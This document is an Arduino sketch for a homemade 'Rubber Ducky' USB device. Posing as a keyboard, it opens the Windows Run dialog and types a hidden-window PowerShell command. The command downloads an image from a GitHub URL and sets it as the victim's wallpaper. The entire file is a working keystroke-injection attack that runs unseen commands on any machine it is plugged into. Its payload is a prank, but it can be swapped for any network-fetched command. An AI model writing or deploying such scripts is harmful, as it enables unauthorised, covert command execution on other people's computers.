#include "Keyboard.h"

// Configuración: URL de la imagen (Direct Link)
const char* imageUrl = "https://raw.githubusercontent.com/M1ch43l-B/rubber-ducky-casero/main/src/jesucristo.jpeg";

void setup() {
  // Iniciamos la emulación de teclado
  Keyboard.begin();

  // Esperar 2 segundos después de conectar para que el PC reconozca el "teclado"
  delay(2000);

  // 1. Abrir el comando "Ejecutar" (Win + R)
  Keyboard.press(KEY_LEFT_GUI); // Tecla Windows
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();
  delay(500);

  // 2. Escribir el comando de PowerShell para cambiar el fondo
  // Se usa 'powershell -w h' para que la ventana sea oculta (hidden)
  String command = "powershell -w h -NoP -C \"$i='";
  command += imageUrl;
  command += "'; $p=\"\"$env:TEMP\\bg.jpg\"\"; (New-Object System.Net.WebClient).DownloadFile($i,$p); Add-Type -TypeDefinition 'using System.Runtime.InteropServices; public class W {[DllImport(\"\"user32.dll\"\")] public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);}'; [W]::SystemParametersInfo(20, 0, $p, 3)\"";

  Keyboard.print(command);
  delay(200);

  // 3. Ejecutar
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.releaseAll();

  // Terminamos la emulación
  Keyboard.end();
}

void loop() {
  // No necesitamos nada en el loop para que solo se ejecute una vez al conectar
}